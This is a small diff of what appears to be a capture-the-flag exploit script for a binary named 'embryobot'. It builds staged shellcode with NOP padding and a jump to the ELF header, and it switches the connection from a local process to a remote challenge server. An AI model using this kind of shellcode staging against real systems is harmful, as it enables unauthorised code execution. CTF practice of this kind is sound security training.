@@ -19,9 +19,9 @@ left = 16 - len(stage_2)
 # create [read more bytes][padding][jmp to ehdr]
 init = stage_2 + b'\x90'*left + stage_1
 
-io = process("./embryobot")
+# io = process("./embryobot")
 # io = remote("172.17.0.2",2000)
-# io = remote("0.cloud.chals.io",18078)
+io = remote("0.cloud.chals.io",20922)
 # Exposed Service on :
 
 # jmp and read more data
